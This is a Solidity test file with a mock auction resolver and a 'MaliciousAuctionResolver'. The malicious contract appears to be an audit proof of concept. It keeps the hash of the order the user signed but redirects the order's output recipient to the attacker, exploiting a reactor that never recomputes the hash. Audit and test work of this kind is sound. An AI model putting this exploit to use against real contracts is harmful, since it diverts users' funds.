// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IAuctionResolver} from "../../../../src/v4/interfaces/IAuctionResolver.sol";
import {ResolvedOrder} from "../../../../src/v4/interfaces/IAuctionResolver.sol";
import {SignedOrder} from "../../../../src/base/ReactorStructs.sol";
import {MockOrder, MockOrderLib} from "./MockOrderLib.sol";
import "forge-std/console2.sol";

/// @notice Simple auction resolver for testing UnifiedReactor basic functionality
contract MockAuctionResolver is IAuctionResolver {
    using MockOrderLib for MockOrder;

    /// @inheritdoc IAuctionResolver
    function resolve(SignedOrder calldata signedOrder) external view override returns (ResolvedOrder memory) {
        MockOrder memory mockOrder = abi.decode(signedOrder.order, (MockOrder));

        return ResolvedOrder({
            info: mockOrder.info,
            input: mockOrder.input,
            outputs: mockOrder.outputs,
            sig: signedOrder.sig,
            hash: mockOrder.hash(),
            auctionResolver: address(this)
        });
    }

    /// @inheritdoc IAuctionResolver
    function getPermit2OrderType() external pure override returns (string memory) {
        return MockOrderLib.PERMIT2_ORDER_TYPE;
    }
}

/// @notice Simple auction resolver for testing UnifiedReactor basic functionality
contract MaliciousAuctionResolver is IAuctionResolver {
    using MockOrderLib for MockOrder;

    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    /// @inheritdoc IAuctionResolver
    function resolve(SignedOrder calldata signedOrder) external view override returns (ResolvedOrder memory) {
        console2.log("MaliciousAuctionResolver: resolve called");
        MockOrder memory mockOrder = abi.decode(signedOrder.order, (MockOrder));
        // @audit for the attack, we return the original order hash the user signed on
        bytes32 originalHash = mockOrder.hash();
        console2.logBytes32(originalHash);
        console2.log("Original auction resolver:", address(mockOrder.info.auctionResolver));
        console2.log("Replacing with:", address(this));

        // @audit but here, we modify order data. This modifies the hash but it is not recalculated by the Reactor so it is exploitable.
        mockOrder.info.auctionResolver = this;
        mockOrder.outputs[0].recipient = attacker;

        return ResolvedOrder({
            info: mockOrder.info,
            input: mockOrder.input,
            outputs: mockOrder.outputs,
            sig: signedOrder.sig,
            hash: originalHash,
            auctionResolver: address(this)
        });
    }

    /// @inheritdoc IAuctionResolver
    function getPermit2OrderType() external pure override returns (string memory) {
        return MockOrderLib.PERMIT2_ORDER_TYPE;
    }
}
